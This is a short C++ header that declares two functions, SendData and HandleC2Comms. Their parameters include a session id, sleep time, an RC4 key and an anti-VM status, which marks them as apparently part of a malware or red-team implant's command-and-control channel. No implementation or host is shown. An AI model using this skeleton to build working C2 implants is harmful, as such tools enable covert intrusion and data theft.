#include "main.h"
#include "EncUtils.h"
#include "base64.h"



int SendData(std::vector<char> pData, int* sleep_time, std::string* session_id, CryptoPP::SecByteBlock* rc4Key);

int HandleC2Comms(bool* first_packet, std::string* fdateTime, int* sleep_time, std::string* session_id, CryptoPP::SecByteBlock* rc4Key, std::string antiVMStatus);